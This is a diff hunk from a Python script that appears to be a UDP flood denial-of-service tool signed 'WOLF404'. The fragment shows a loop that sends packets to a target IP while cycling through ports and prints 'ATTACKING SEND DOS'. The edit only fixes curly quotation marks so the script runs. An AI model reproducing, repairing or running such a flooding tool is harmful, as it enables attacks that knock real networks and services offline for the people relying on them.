@@ -51,7 +51,7 @@ def script():
                  else:
                          pass
            sock.sendto(bytes, (ip, port))
-           print (“ [ ? ] ATTACKING SEND DOS BY: WOLF404 “)
+           print (" [ ? ] ATTACKING SEND DOS BY: WOLF404 ")
            if port == 65500:
             port = 1
 script()
